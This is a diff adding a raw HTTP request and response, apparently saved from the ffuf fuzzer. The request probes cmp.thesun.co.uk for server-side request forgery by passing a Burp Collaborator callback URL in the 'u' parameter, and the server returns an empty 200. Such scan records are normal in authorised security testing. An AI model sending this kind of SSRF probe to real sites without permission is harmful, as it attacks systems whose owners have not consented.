@@ -1,0 +1,15 @@
+GET /?u=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net HTTP/1.1
+Host: cmp.thesun.co.uk
+User-Agent: Fuzz Faster U Fool v1.2.0-git
+Accept-Encoding: gzip
+
+
+---- ↑ Request ---- Response ↓ ----
+
+HTTP/1.1 200 OK
+Connection: keep-alive
+Content-Type: application/javascript
+Date: Sat, 17 Apr 2021 08:08:53 GMT
+Server: Jetty(9.4.2.v20170220)
+Content-Length: 0
+
